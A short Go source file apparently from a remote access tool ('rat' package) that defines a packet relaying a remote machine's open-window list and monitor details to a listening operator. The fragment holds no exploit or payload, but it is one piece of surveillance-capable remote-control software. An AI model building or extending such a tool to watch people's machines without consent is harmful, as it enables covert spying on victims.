package main

import (
	"rat/shared"
	"rat/shared/network/header"
)

type WindowsPacket struct {
	Windows []shared.Window `network:"receive,send"`
	Action  int             `network:"send"`
}

func (packet WindowsPacket) Header() header.PacketHeader {
	return header.WindowsHeader
}

func (packet WindowsPacket) Init(c *Client) {

}

func (packet WindowsPacket) OnReceive(c *Client) error {
	if ws, ok := c.Listeners[header.WindowsHeader]; ok {
		return sendMessage(ws, c, WindowMessage{
			Monitors: c.Monitors,
			Frames:   packet.Windows,
		})
	}

	return nil
}
